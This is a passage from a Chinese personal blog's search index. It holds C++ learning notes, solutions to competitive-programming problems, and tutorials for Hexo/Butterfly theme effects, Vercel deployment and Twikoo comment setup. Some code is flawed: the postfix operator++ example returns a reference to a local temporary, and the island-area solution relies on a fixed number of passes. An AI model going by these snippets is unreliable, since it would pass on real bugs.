return 0;&#125;","tags":"c++实用语法"},{"title":"auto用法","url":"/post/77858f66.html","text":"前言auto会根据赋给变量的初值自动填充变量类型，当变量类型很长的时候尤其好用 注意（1）使用auto必须要赋初值，且初值不能是模板或函数等不确定类型，因为需要根据初值判断变量类型 （2）使用auto同时定义几个变量要求这几个变量的初值类型相同 1auto a = 3, b = &#x27;3&#x27;, c = &quot;3&quot;; // 这样不行，初值类型不同只能分开写 示例123std::vector&lt;std::string&gt; name = &#123;&quot;ljy&quot;, &quot;wy&quot;, &quot;wz&quot;, &quot;dqy&quot;&#125;;for (auto i = name.begin(); i != name.end(); i++) // 这里auto替换了std::vector&lt;std::string&gt;::iterator std::cout &lt;&lt; *i &lt;&lt; std::endl; 上述循环根据c++11标准也可以这样写123std::vector&lt;std::string&gt; name = &#123;&quot;ljy&quot;, &quot;wy&quot;, &quot;wz&quot;, &quot;dqy&quot;&#125;;for (auto i : name) // 注意，这里auto替换的是std::string，即直接将容器中的每个元素赋给了i进行遍历 std::cout &lt;&lt; i &lt;&lt; std::endl; 今天第一次看到这样的用法，觉得非常方便^_^","tags":"c++实用语法"},{"title":"为什么推荐用++i","url":"/post/415de4d5.html","text":"前言1for (int i = 0; i &lt; 10; ++i) 以前看别人这么写都不太在意，今天偶然瞥到有说++i比i++效率更高 运算符重载于是我去找了一下两种运算重载方法： （1）i++1234567//后置++运算符重载 Num&amp; operator ++(int n) // int n是为了与重载前置++区分开 &#123; Num temp = *this; this-&gt;num++; return temp; &#125; (2) ++i123456//前置++运算符重载 test&amp; operator ++() &#123; this-&gt;num++; return *this; &#125; 对比可以发现，++i比i++省略了一步储存原变量的过程","tags":"c++实用语法"},{"title":"c++ sort函数","url":"/post/3216d44c.html","text":"今天get到了一点sort自定义排序函数的用法 sort函数的优势STL中的sort()并非只是普通的快速排序，除了对普通的快速排序进行优化，它还结合了插入排序和堆排序。根据不同的数量级别以及不同情况，能自动选用合适的排序方法。当数据量较大时采用快速排序，分段递归。一旦分段后的数据量小于某个阀值，为避免递归调用带来过大的额外负荷，便会改用插入排序。而如果递归层次过深，有出现最坏情况的倾向，还会改用堆排序，是一个非常灵活方便的函数~ sort函数的使用（1）头文件：1#include &lt;algorithm&gt; （2）参数：sort函数一共有三个参数：sort(begin, end, cmp) ​ begin为指向待排序的结构的第一个元素的指针 ​ end为指向待排序的结构的最后一个元素的下一个位置的指针 ​ cmp参数为排序准则，cmp参数可以不写，如果不写的话，默认从小到大进行排序 （3）自定义排序准则​ 对类排序: 1234567891011121314class Pair&#123;public: string name; // 学生姓名 int grade; // 学生成绩&#125;;// 将你希望情况作为返回bool cmp_grade(Pair x, Pair y) // x为前一项数据，y为后一项数据&#123; return x.grade &gt; y.grade;&#125;sort(pair, pair + n, cmp_grade); // n为学生人数 ​ 对一般数据类型从大到小排序 注意：这里的greater是函数，要加() 12345678int num1[3] = &#123;3, 1, 2&#125;;sort(num1, num1 + 3, greater&lt;int&gt;());float num2[3] = &#123;3.1, 1.2, 2.3&#125;;sort(num2, num2 + 3, greater&lt;float&gt;());double num3[3] = &#123;3.1125, 1.2332, 2.3556&#125;;sort(num3, num3 + 3, greater&lt;double&gt;()); 还有别的用法欢迎在评论区补充~","tags":"c++实用函数"},{"title":"数字排序","url":"/post/84cbdd88.html","text":"【问题描述】 给定n个整数，请统计出每个整数出现的次数，按出现次数从多到少的顺序输出。 【输入形式】 输入的第一行包含一个整数n，表示给定数字的个数。 第二行包含n个整数，相邻的整数之间用一个空格分隔，表示所给定的整数。 【输出形式】 输出多行，每行包含两个整数，分别表示一个给定的整数和它出现的次数。按出现次数递减的顺序输出。如果两个整数出现的次数一样多，则先输出值较小的，然后输出值较大的。 【样例输入】 12 5 2 3 3 1 3 4 2 5 2 3 5 【样例输出】 3 4 2 3 5 3 1 1 4 1 【评分标准】 评测用例规模与约定 1 ≤ n ≤ 1000，给出的数都是不超过1000的非负整数。 思路：（1）将每个数字与其出现频率绑定定义为Pair类，定义Pair类数组;（2）接收输入，判断输入数字是否存在，存在则对应数字频率加一，不存在则写入数字并频率加一;（3）sort函数自定义排序1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;algorithm&gt;#define N 1000 // 测试请将N改小using namespace std;class Pair&#123;public: int num = 0; // 数字 int fre = 0; // 频率&#125;;int inArray(int n, Pair *p, int &amp;pos)&#123; for (int i = 0; i &lt; pos; i++) &#123; if (p[i].num == n) &#123; p[i].fre++; return 1; // 该数字已存在 &#125; &#125; p[pos].num = n; p[pos].fre++; pos++; return 0; // 该数字不存在&#125;bool cmp_fre(Pair x, Pair y)&#123; if (x.fre == y.fre) return x.num &lt; y.num; return x.fre &gt; y.fre;&#125;void out(Pair *p, int n)&#123; for (int i = 0; i &lt; n; i++) &#123; cout &lt;&lt; p[i].num &lt;&lt; &#x27; &#x27; &lt;&lt; p[i].fre &lt;&lt; endl; &#125;&#125;void initial(Pair *p, int n, int &amp;pos)&#123; int temp; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; temp; inArray(temp, p, pos); // 判断读取的数字是否已经存在，pos表示当前pair数组中存放的结果总数 &#125;&#125;int main()&#123; int n, pos = 0; // pos对应下一个数字存放的下标 Pair pair[N]; cin &gt;&gt; n; // 数字个数 initial(pair, n, pos); sort(pair, pair + pos, cmp_fre); out(pair, pos); return 0;&#125; 如果有更好的写法欢迎在评论区给出噢^_^","tags":"c++刷题"},{"title":"黑夜模式文字霓虹灯特效","url":"/post/c22ddd92.html","text":"前言博客开启黑夜模式以后为大标题和个人卡片添加霓虹灯特效 添加代码打开Blog根目录/source/css/custom.css，路径中缺少的文件夹或文件直接创建即可，写入下列代码 可以把‘—theme-color’修改为你喜欢的颜色，例如墨绿色：rgb(91,165,133) 12345678910/* 夜间模式菜单栏发光字 */[data-theme=&quot;dark&quot;] #nav .site-page,[data-theme=&quot;dark&quot;] #nav .menus_items .menus_item .menus_item_child li a &#123; text-shadow: 0 0 2px var(--theme-color) !important;&#125;/* 手机端适配 */[data-theme=&quot;dark&quot;] #sidebar #sidebar-menus .menus_items .site-page &#123; text-shadow: 0 0 2px var(--theme-color) !important;&#125; 新建脚本文件打开Blog根目录\\source\\js\\light.js，路径中缺少的文件夹或文件直接创建即可，写入下列代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 霓虹灯效果// 颜色数组var arr = [&quot;#39c5bb&quot;, &quot;#f14747&quot;, &quot;#f1a247&quot;, &quot;#f1ee47&quot;, &quot;#b347f1&quot;, &quot;#1edbff&quot;, &quot;#ed709b&quot;, &quot;#5636ed&quot;];// 颜色索引var idx = 0;// 切换颜色function changeColor() &#123; // 仅夜间模式才启用 if (document.getElementsByTagName(&#x27;html&#x27;)[0].getAttribute(&#x27;data-theme&#x27;) == &#x27;dark&#x27;) &#123; if (document.getElementById(&quot;site-name&quot;)) document.getElementById(&quot;site-name&quot;).style.textShadow = arr[idx] + &quot; 0 0 15px&quot;; if (document.getElementById(&quot;site-title&quot;)) document.getElementById(&quot;site-title&quot;).style.textShadow = arr[idx] + &quot; 0 0 15px&quot;; if (document.getElementById(&quot;site-subtitle&quot;)) document.getElementById(&quot;site-subtitle&quot;).style.textShadow = arr[idx] + &quot; 0 0 10px&quot;; if (document.getElementById(&quot;post-info&quot;)) document.getElementById(&quot;post-info&quot;).style.textShadow = arr[idx] + &quot; 0 0 5px&quot;; try &#123; document.getElementsByClassName(&quot;author-info__name&quot;)[0].style.textShadow = arr[idx] + &quot; 0 0 12px&quot;; document.getElementsByClassName(&quot;author-info__description&quot;)[0].style.textShadow = arr[idx] + &quot; 0 0 12px&quot;; &#125; catch &#123; &#125; idx++; if (idx == 8) &#123; idx = 0; &#125; &#125; else &#123; // 白天模式恢复默认 if (document.getElementById(&quot;site-name&quot;)) document.getElementById(&quot;site-name&quot;).style.textShadow = &quot;#1e1e1ee0 1px 1px 1px&quot;; if (document.getElementById(&quot;site-title&quot;)) document.getElementById(&quot;site-title&quot;).style.textShadow = &quot;#1e1e1ee0 1px 1px 1px&quot;; if (document.getElementById(&quot;site-subtitle&quot;)) document.getElementById(&quot;site-subtitle&quot;).style.textShadow = &quot;#1e1e1ee0 1px 1px 1px&quot;; if (document.getElementById(&quot;post-info&quot;)) document.getElementById(&quot;post-info&quot;).style.textShadow = &quot;#1e1e1ee0 1px 1px 1px&quot;; try &#123; document.getElementsByClassName(&quot;author-info__name&quot;)[0].style.textShadow = &quot;&quot;; document.getElementsByClassName(&quot;author-info__description&quot;)[0].style.textShadow = &quot;&quot;; &#125; catch &#123; &#125; &#125;&#125;// 开启计时器window.onload = setInterval(changeColor, 1200); 引入文件打开主题配置文件_config.butterfly.yml，搜索inject并按下列格式补充完整 12345inject: head: - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/custom.css&quot; media=&quot;defer&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt; bottom: - &lt;script defer src=&quot;/js/light.js&quot;&gt;&lt;/script&gt; # 霓虹灯(必须defer否则有时候会不生效) hexo三连查看效果1hexo cl &amp;&amp; hexo g &amp;&amp; hexo s","tags":"博客美化"},{"title":"打卡记录","url":"/post/d1ee6067.html","text":"今天也要元气满满","tags":""},{"title":"使用Vercel加速博客","url":"/post/f6bf5d88.html","text":"前言Vercel在全球都分布有CDN节点，比Github自带的Github Page更加稳定且访问速度更快，并且部署简单而且不用花钱 Vercel注册如果你看过之前的文章：添加Twikoo实现博客在线评论的话，你应该已经注册好了自己的Vercel账号 若未注册请参考添加Twikoo实现博客在线评论 或者自行注册：https://vercel.com/signup 创建仓库点击头像来到首页并点击添加project 如果有你的仓库地址就可以直接import，没有的话就点击下方的Import Third-Party Git Respository并输入你的Github仓库网址(例如我的是：hellodqy.github.io) 保持默认选项点击Deploy即可 修改域名由于Vercel的域名被墙了，所以我们需要将其修改为我们的个人域名(个人域名购买请参考添加Twikoo实现博客在线评论中的申请个人域名章节) 再次回到首页，点击你新建的项目 点击settings 点击Domains 在Domains填入你的个人域名 DNS解析(以阿里云为例)Vercel一般会给出两行记录要你添加到你的DNS供应商 首页打开控制台 点击图片中的云解析 点击你购买的域名 点击添加记录 按照Vercel给的格式填： Type：A ​ 主机记录：@ ​ 解析：保持默认 ​ 记录值：xx.xx.xx.xx ​ TTL：10分钟 Type：CNAME ​ 主机记录：www ​ 解析：保持默认 ​ 记录值：xxx-dns.com ​ TTL：10分钟 重新部署修改完以后回到Vercel首页，打开项目 点击Deployments选项 点击带有current标识的版本最右边的三个点，点击Redeploy 部署完成耐心等待即可~","tags":"博客加速"},{"title":"Github Page绑定个人域名","url":"/post/fa674e5f.html","text":"前言在之前的配置Twikoo评论一文中我们购买了自己的域名，当时只用了二级域名解决Vercel域名被墙的问题，现在我们把Github Page的域名修改为我们自己的域名 DNS解析(以阿里云为例)阿里云首页打开控制台 点击图片中的云解析 点击你购买的域名 点击添加记录 我们需要添加两条记录： 记录类型：CNAME 主机记录：@ 解析请求来源：保持默认 记录值：网站域名，例如我的是：hellodqy.github.io TTL：10分钟 记录类型：CNAME 主机记录：www 解析请求来源：保持默认 记录值：网站域名 TTL：10分钟 添加CNAME文件打开Blog根目录/source，新建一个文件名为CNAME的无后缀文件，填入你购买的个人域名，不需要添加https://前缀，例如我的是： 1dqywy.top Github Page添加个人域名进入.github.io仓库，打开settings 打开Pages选项 下拉页面，找到Custom domain并填入你购买的个人域名，勾选Enforce HTTPS 注意：这里需要等待一段加载时间才能勾选Enforce HTTPS 完成以后即可通过你购买的个人域名访问你的网站了 解决部署后需要重新在Github绑定域名的问题打开Blog根目录的站点配置文件_config.yml，搜索skip_render并填写CNAME使每次部署的时候CNAME不被渲染 1skip_render: CNAME","tags":"博客搭建"},{"title":"实现网站动态标题","url":"/post/15286781.html","text":"添加脚本文件打开Blog根目录/source/js/title.js，路径中缺失的文件夹或文件直接新建即可 写入下列代码 1234567891011121314151617//动态标题var OriginTitile = document.title;var titleTime;document.addEventListener(&#x27;visibilitychange&#x27;, function () &#123; if (document.hidden) &#123; //离开当前页面时标签显示内容 document.title = &#x27;不要走嘛(´•̥̥̥ω•̥̥̥`)&#x27;; clearTimeout(titleTime); &#125; else &#123; //返回当前页面时标签显示内容 document.title = &#x27;欢迎回来(✪ω✪)&#x27;; //两秒后变回正常标题 titleTime = setTimeout(function () &#123; document.title = OriginTitile; &#125;, 2000); &#125;&#125;); 引用脚本文件打开主题配置文件_config.butterfly.yml并按下列格式补充完整 123inject: bottom: - &lt;script async src=&quot;/js/title.js&quot;&gt;&lt;/script&gt; hexo三连查看效果","tags":"博客美化"},{"title":"个人卡片实现渐变色","url":"/post/25226bb5.html","text":"添加代码打开Blog根目录/source/css/custom.css，路径中的css文件夹或custom.css文件没有的话就新建，写入如下代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/* 侧边栏个人信息卡片动态渐变色 */#aside-content &gt; .card-widget.card-info &#123; background: linear-gradient( -45deg, #e8d8b9, #eccec5, #a3e9eb, #bdbdf0, #eec1ea ); box-shadow: 0 0 5px rgb(66, 68, 68); position: relative; background-size: 400% 400%; -webkit-animation: Gradient 10s ease infinite; -moz-animation: Gradient 10s ease infinite; animation: Gradient 10s ease infinite !important;&#125;@-webkit-keyframes Gradient &#123; 0% &#123; background-position: 0% 50%; &#125; 50% &#123; background-position: 100% 50%; &#125; 100% &#123; background-position: 0% 50%; &#125;&#125;@-moz-keyframes Gradient &#123; 0% &#123; background-position: 0% 50%; &#125; 50% &#123; background-position: 100% 50%; &#125; 100% &#123; background-position: 0% 50%; &#125;&#125;@keyframes Gradient &#123; 0% &#123; background-position: 0% 50%; &#125; 50% &#123; background-position: 100% 50%; &#125; 100% &#123; background-position: 0% 50%; &#125;&#125;/* 黑夜模式适配 */[data-theme=&quot;dark&quot;] #aside-content &gt; .card-widget.card-info &#123; background: #191919ee;&#125;/* 个人信息Follow me按钮 */#aside-content &gt; .card-widget.card-info &gt; #card-info-btn &#123; background-color: #3eb8be; border-radius: 8px;&#125; 引入代码打开主题配置文件_config.butterfly.yml，搜索inject并按下列格式补充完整即可 123inject: head: - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/custom.css&quot;&gt; hexo三连查看效果","tags":"博客美化"},{"title":"添加看板娘","url":"/post/2fd28ec8.html","text":"前言我安装的是博客自带的看板娘，比较推荐这个，消耗资源比较少，虽然不会说话也不能换装，但是会乖乖地盯着你的鼠标~ 安装打开Blog根目录cmd并输入以下命令 1npm install --save hexo-helper-live2d 配置打开Blog根目录下的站点配置文件_config.yml搜索live2d，没有的话就将下列内容复制到最底部 123456789101112131415161718192021222324# Live2D## https://github.com/EYHN/hexo-helper-live2dlive2d: enable: true #开关插件版看板娘 scriptFrom: local # 默认 pluginRootPath: live2dw/ # 插件在站点上的根目录(相对路径) pluginJsPath: lib/ # 脚本文件相对与插件根目录路径 pluginModelPath: assets/ # 模型文件相对与插件根目录路径 # scriptFrom: jsdelivr # jsdelivr CDN # scriptFrom: unpkg # unpkg CDN # scriptFrom: https://npm.elemecdn.com/live2d-widget@3.x/lib/L2Dwidget.min.js # 你的自定义 url tagMode: false # 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中 debug: false # 调试, 是否在控制台输出日志 model: use: live2d-widget-model-wanko # npm-module package name # use: wanko # 博客根目录/live2d_models/ 下的目录名 # use: ./wives/wanko # 相对于博客根目录的路径 # use: https://npm.elemecdn.com/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # 你的自定义 url display: position: right #控制看板娘位置 width: 150 #控制看板娘大小 height: 300 #控制看板娘大小 mobile: show: true # 手机中是否展示 更换形象预览并挑选一个喜欢的看板娘形象，我选择的是一个白帽子小孩：live2d-widget-model-koharu 看板娘模型预览：(4条消息) Hexo添加Live2D看板娘+模型预览 打开Blog根目录cmd，复制你选择的看板娘编码并执行命令，注意替换编码1npm install --save live2d-widget-model-koharu 打开Blog根目录下的站点配置文件_config.yml搜索model，将其修改为你的看板娘编码 123model: use: live2d-widget-model-koharu # 默认为live2d-widget-model-wanko hexo三连即可在本地预览效果 1hexo cl &amp;&amp; hexo g &amp;&amp; hexo s 卸载看板娘打开Blog根目录cmd并输入以下命令 12npm uninstall hexo-helper-live2d #卸载看板娘插件npm uninstall live2d-widget-model-modelname #卸载看板娘模型。记得替换modelname为看板娘名称 打开Blog根目录下的站点配置文件_config.yml搜索live2d，将该配置项注释掉即可","tags":"博客插件"},{"title":"小岛面积","url":"/post/1ee68337.html","text":"题目：用一个二维方阵（最小为3X3，最大为9X9）表示一片海域。方阵中的元素只由0和1组成。1表示海岸线。计算由海岸线围起来的小岛面积（即：由1围起来的区域中0的个数） **上述方阵表示的海域满足下面两个要求： 1、小岛只有一个 2、用1表示的海岸线肯定可以封闭成一个小岛，但有可能是凸的，也有可能是凹的，所以在判断时：对于方阵中的任意一个元素0，如果其位于同一行上的两个1之间，并且位于同一列上的两个1之间，则该元素肯定在1围起来的区域中。不符合该规定的其它情况不考虑。** 样例： 输入： 6 0 0 0 1 0 0 0 0 1 0 1 0 0 1 0 0 0 1 1 0 0 0 1 0 1 0 1 0 1 0 1 1 0 1 1 1 输出： 9 思路：边界上的0一定不被1包围，将其值改为2，与2有接触的0被感染成2，不断感染，最后幸存的0是被1包围的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;using namespace std;int main()&#123; int n; int sea[9][9]; int sum = 0; cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; cin &gt;&gt; sea[i][j]; &#125; &#125; for (int k = 0; k &lt; 5; k++) // 矩阵最大为9x9, 最多的情况是中间的0不被包含，则需要侵蚀5次 &#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (sea[i][j] == 0) &#123; if (i == 0 || i == n - 1 || j == 0 || j == n - 1) sea[i][j] = 2; else if (sea[i][j - 1] == 2 || sea[i - 1][j] == 2 || sea[i][j + 1] == 2 || sea[i + 1][j] == 2) sea[i][j] = 2; &#125; &#125; &#125; &#125; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (!sea[i][j]) sum++; &#125; &#125; cout &lt;&lt; sum;&#125; 如果有更好的写法欢迎在评论区给出噢^_^","tags":"c++刷题"},{"title":"Yura's Smile","url":"/post/c020e7d8.html","text":"题目After holding one team contest, boy Yura got very tired and wanted to change his life and move to Japan. In honor of such a change, Yura changed his name to something nice. Fascinated by this idea he already thought up a name s consisting only of characters ““ and “^”. But there’s a problem — Yura likes smiley faces “^^” and “^^”. Therefore any character of the name must be a part of at least one such smiley. Note that only the consecutive characters of the name can be a smiley face. More formally, consider all occurrences of the strings “^^” and “^^” in the string s. Then all such occurrences must cover the whole string s, possibly with intersections. For example, in the string “^^__^^^__^” the characters at positions 3,4,9,10 and 11 are not contained inside any smileys, and the other characters at positions 1,2,5,6,7 and 8 are contained inside smileys. In one operation Jura can insert one of the characters “_” and “^” into his name s (you can insert it at any position in the string). He asks you to tell him the minimum number of operations you need to do to make the name fit Yura’s criteria. InputEach test consists of multiple test cases. The first line contains a single integer t(1≤t≤100) —the number of test cases. The description of test cases follows. The first and only line of each test case contains a single string s (1≤|s|≤100), consisting of characters “_” and “^”, — the name to change. OutputFor each test case, output a single integer — the minimum number of characters you need to add to the name to make it fit for Yura. If you don’t need to change anything in the name, print 0. Example 第一次做英文编程题，看得有点懵，大概是在说，输入多行字符串，每个字符串由^或下划线组成，要求每个字符串的每个字符都能和相邻的字符组成^^或^_^，问需要添加的 ^ 和下划线的最小数目是多少 我的思路是，遍历字符串，搜索下划线，找到就观察其相邻两边是否有 ^ ，两边都有就直接删除掉这个下划线；只有一个就计数加一，并删除这个下划线；一个都没有就计数加二，删除该下划线并在该位置插入一个 ^；只有一个字符的字符串单独处理 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main()&#123; string str; int n, pos, res[100] = &#123; 0 &#125;; cin &gt;&gt; n; getline(cin, str); // 把前面cin遗留的结束符处理掉 for (int i = 0; i &lt; n; i++) &#123; getline(cin, str); if (str == &quot;^&quot;) res[i]++; while ((pos = str.find(&#x27;_&#x27;)) != string::npos) // 字符串中没有&#x27;_&#x27;时停止 &#123; if (0 == pos) // &#x27;_&#x27;在第一个位置 &#123; if (&#x27;^&#x27; == str[pos + 1]) &#123; res[i]++; str.erase(pos, 1); // 删除&#x27;_&#x27; break; &#125; else &#123; str.erase(pos, 1); // 删除&#x27;_&#x27; str.insert(pos, 1, &#x27;^&#x27;); res[i] += 2; &#125; &#125; else if (str.size() - 1 == pos) // &#x27;_&#x27;在最后一个位置 &#123; if (&#x27;^&#x27; == str[pos - 1]) &#123; res[i]++; str.erase(pos, 1); // 删除&#x27;_&#x27; break; &#125; else &#123; str.erase(pos, 1); // 删除&#x27;_&#x27; str.insert(pos, 1, &#x27;^&#x27;); res[i] += 2; &#125; &#125; else // &#x27;_&#x27;在中间 &#123; if (&#x27;^&#x27; == str[pos - 1]) &#123; if (&#x27;^&#x27; == str[pos + 1]) &#123; str.erase(pos, 1); &#125; else &#123; res[i]++; str.erase(pos, 1); &#125; &#125; else if (&#x27;^&#x27; != str[pos - 1]) &#123; if (&#x27;^&#x27; == str[pos + 1]) &#123; str.erase(pos, 1); res[i]++; &#125; else &#123; res[i] += 2; str.erase(pos, 1); str.insert(pos, 1, &#x27;^&#x27;); &#125; &#125; &#125; &#125; &#125; for (int i = 0; i &lt; n; i++) cout &lt;&lt; res[i] &lt;&lt; endl; return 0;&#125; 如果有更好的写法欢迎在评论区给出噢^_^","tags":"c++刷题"},{"title":"Twikoo评论通用配置","url":"/post/e988d7ce.html","text":"添加Twikoo请查看文章添加Twikoo实现博客在线评论 安装完成后可以对Twikoo进行以下配置： 评论区美化参考自：Leonus的博客与陈鑫磊的博客 效果预览 新建Blog\\source\\css\\custom.css，缺少的文件夹或文件直接创建即可，在末尾添加下列代码 ​ 这段代码的主要作用就是增加边框的立体感和圆润度 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129/* 声名部分变量 */:root &#123; --cxl2020mc-radius: 7px; --cxl2020mc-card-border-width: 1px;&#125;/* 浅色模式颜色 */[data-theme=light] &#123; --cxl2020mc-border-color: #e3e8f7; --cxl2020mc-card-bg: #fff; --cxl2020mc-card-border: #e3e8f7; --style-border-always: 1px solid var(--cxl2020mc-card-border); --cxl2020mc-blue: #425AEF;&#125;/* 深色模式颜色 */[data-theme=dark] &#123; --cxl2020mc-border-color: #42444a; --cxl2020mc-card-bg: #1d1b26; --cxl2020mc-card-border: #42444a; --style-border-always: 1px solid var(--cxl2020mc-card-border); --cxl2020mc-blue: #0084FF;&#125;/* 评论区评论大框 */.twikoo .tk-comments-container&gt;.tk-comment &#123; /* 内边距 */ padding: 1rem; /* 圆角 */ border-radius: var(--cxl2020mc-radius); /* 背景颜色 */ background: var(--cxl2020mc-card-bg); /* 变动动画时长 */ transition: .3s;&#125;/* 浅色模式评论区评论大框 */[data-theme=light] .twikoo .tk-comments-container&gt;.tk-comment &#123; /* 阴影 */ box-shadow: var(--card-box-shadow);&#125;/* 浅色模式评论区评论大框阴影悬浮加深 */[data-theme=light] .twikoo .tk-comments-container&gt;.tk-comment:hover &#123; /* 阴影（浅色模式突出层次感） */ box-shadow: var(--card-hover-box-shadow);&#125;/* 黑暗模式评论区评论大框 */[data-theme=dark] .twikoo .tk-comments-container&gt;.tk-comment &#123; /* 边框样式 */ border-style: solid; /* 边框宽度 */ border-width: var(--cxl2020mc-card-border-width); /* 边框颜色 */ border-color: var(--cxl2020mc-card-border);&#125;/* 设备信息 */.twikoo .tk-extra &#123; /* 圆角 */ border-radius: var(--cxl2020mc-radius); /* 背景颜色 */ background: var(--cxl2020mc-card-bg); /* 内边距 */ padding: 0.4rem; /* 底边距 */ margin-bottom: 1rem; /* 变动动画时长 */ transition: .3s;&#125;/* 浅色模式设备信息 */[data-theme=light] .twikoo .tk-extra &#123; /* 阴影 */ box-shadow: var(--card-box-shadow);&#125;/* 浅色模式设备信息阴影悬浮加深 */[data-theme=light] .twikoo .tk-extra:hover &#123; /* 阴影 */ box-shadow: var(--card-hover-box-shadow);&#125;/* 黑暗模式设备信息 */[data-theme=dark] .twikoo .tk-extra &#123; /* 边框样式 */ border-style: solid; /* 边框宽度 */ border-width: var(--cxl2020mc-card-border-width); /* 边框颜色 */ border-color: var(--cxl2020mc-card-border);&#125;/* 加载更多按钮 */.twikoo .tk-expand &#123; /* 圆角 */ border-radius: var(--cxl2020mc-radius);&#125;/* 浅色模式加载更多按钮 */[data-theme=light] .twikoo .tk-expand &#123; /* 阴影 */ box-shadow: var(--card-box-shadow);&#125;/* 浅色模式加载更多按钮（鼠标悬浮时） */[data-theme=light] .twikoo .tk-expand:hover &#123; /* 阴影 */ box-shadow: var(--card-hover-box-shadow); /* 背景颜色 */ background-color: var(--btn-bg);&#125;/* 黑暗模式加载更多按钮（鼠标悬浮时） */[data-theme=dark] .twikoo .tk-expand:hover &#123; /* 背景颜色 */ background-color: var(--cxl2020mc-blue);&#125;/* 黑暗模式加载更多按钮 */[data-theme=dark] .twikoo .tk-expand &#123; /* 边框样式 */ border-style: solid; /* 边框宽度 */ border-width: var(--cxl2020mc-card-border-width); /* 边框颜色 */ border-color: var(--cxl2020mc-card-border);&#125; 在custom.css末尾添加下列代码nth-child(1)(2)(3)分别是你鼠标点击昵称、邮箱、网址框时悬浮显示的内容 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/* 设置文字内容 :nth-child(1)的作用是选择第几个 */.el-input.el-input--small.el-input-group.el-input-group--prepend:nth-child(1):before &#123; content: &#x27;输入QQ号会自动获取昵称和头像🐧&#x27;;&#125;.el-input.el-input--small.el-input-group.el-input-group--prepend:nth-child(2):before &#123; content: &#x27;收到回复将会发送到您的邮箱📧&#x27;;&#125;.el-input.el-input--small.el-input-group.el-input-group--prepend:nth-child(3):before &#123; content: &#x27;可以通过昵称访问您的网站🔗&#x27;;&#125;/* 当用户点击输入框时显示 */.el-input.el-input--small.el-input-group.el-input-group--prepend:focus-within::before,.el-input.el-input--small.el-input-group.el-input-group--prepend:focus-within::after &#123; display: block;&#125;/* 主内容区 */.el-input.el-input--small.el-input-group.el-input-group--prepend::before &#123; /* 先隐藏起来 */ display: none; /* 绝对定位 */ position: absolute; /* 向上移动60像素 */ top: -60px; /* 文字强制不换行，防止left:50%导致的文字换行 */ white-space: nowrap; /* 圆角 */ border-radius: 10px; /* 距离左边50% */ left: 50%; /* 然后再向左边挪动自身的一半，即可实现居中 */ transform: translate(-50%); /* 填充 */ padding: 14px 18px; background: #444; color: #fff;&#125;/* 小角标 */.el-input.el-input--small.el-input-group.el-input-group--prepend::after &#123; display: none; content: &#x27;&#x27;; position: absolute; /* 内容大小（宽高）为0且边框大小不为0的情况下，每一条边（4个边）都是一个三角形，组成一个正方形。 我们先将所有边框透明，再给其中的一条边添加颜色就可以实现小三角图标 */ border: 12px solid transparent; border-top-color: #444; left: 50%; transform: translate(-50%, -48px);&#125; 引入custom.css: 打开主题配置文件_config.butterfly.yml搜索inject找到head头部： 1- &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/custom.css&quot; media=&quot;defer&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt; 随便打开一篇文章，拉到底部，登录Twikoo管理面板，选择配置管理，点开通用选项 （1）COMMENT_PLACEHOLDER设置评论框默认显示的内容，表情可以直接在网上搜emoji复制粘贴进去 （2）设置评论区背景，最好选用纯色的，或者就是选择一个很小的图片作为脚标(可以在阿里巴巴图标库选择一个喜欢的图标并下载，图片大小设置为14左右) （3）其余配置可以自己翻一翻，每项都有中文注释 设置邮箱提醒设置邮箱提醒可以在有小伙伴给你的文章评论时向你发送邮件让你及时知道 开通POP3/SMTP服务(以QQ邮箱为例，其他邮箱类比) 在电脑端打开QQ邮箱并点击最上方的设置 点击帐户 下拉找到POP3/SMTP服务并点击开启服务，按指示验证即可 注意：验证完毕以后会出现授权码，记得保存一会要用 ​ 如果不小心忘记保存授权码可以重新生成并保存 配置邮件通知服务随便打开一篇文章，拉到底部，登录Twikoo管理面板 下拉找到邮件通知选项 可以参考我的配置，没填的就是用的默认SMTP_PASS填刚刚生成的授权码 填写完成以后点击邮件通知测试，收到来自Twikoo的邮件就说明配置正确 到评论区发送一条评论就可以在邮箱收到提醒啦 配置图床我使用的是smms图床，配置简单：SMMS 注册好以后点击上方的user-&gt;Dashboard 点击左侧栏目中的API Token并生成自己的API key后复制 打开自己的评论设置-&gt;配置管理-&gt;插件-&gt;在IAMGE_CDN中填入smms(或其他图床名称)，在IMAGE_CDN_TOKEN填入刚刚生成的API key-&gt;保存并刷新","tags":"博客插件"},{"title":"添加Twikoo实现博客在线评论——2023最新版","url":"/post/d0d1b7a9.html","text":"Vercel部署注意：按照视频教程中执行到云函数运行成功的步骤时请返回本教程 部署方式：https://www.bilibili.com/video/BV1Fh411e7ZH 参考Twikoo文档：https://twikoo.js.org/ 视频中下一步要求我们点击DOMAINS链接，但是这个链接已经被墙了，无法访问到，我们需要更改DOMAINS 申请个人域名阿里云、腾讯云、华为云都可以，我在阿里云申请的 主页搜索域名注册，在搜索记录里点击域名注册 自定义想要的域名 购买域名 域名不需要备案，因为我们只是需要一个二级域名 生成二级域名 在阿里云控制台添加子域名解析记录首页打开控制台 点击图片中的云解析 点击你购买的域名 点击添加记录 记录类型选择CNAME 